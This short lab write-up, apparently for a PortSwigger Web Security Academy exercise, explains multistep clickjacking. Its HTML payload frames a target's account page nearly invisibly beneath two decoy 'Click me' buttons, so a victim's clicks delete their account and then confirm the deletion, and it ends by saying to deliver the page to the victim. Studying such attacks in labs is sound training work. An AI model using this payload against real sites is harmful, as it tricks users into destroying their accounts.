# Multistep clickjacking

create a iframe and above that make double click buttons.First one to hit delete account buton and second one to confirm it.

```html
<style>
	iframe {
		position:relative;
		width:800;
		height: 700;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:300px;
		left:200px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0aad006d0399b31182af74440091001a.web-security-academy.net/my-account"></iframe>
```

adjust position of click and deliver it to victim
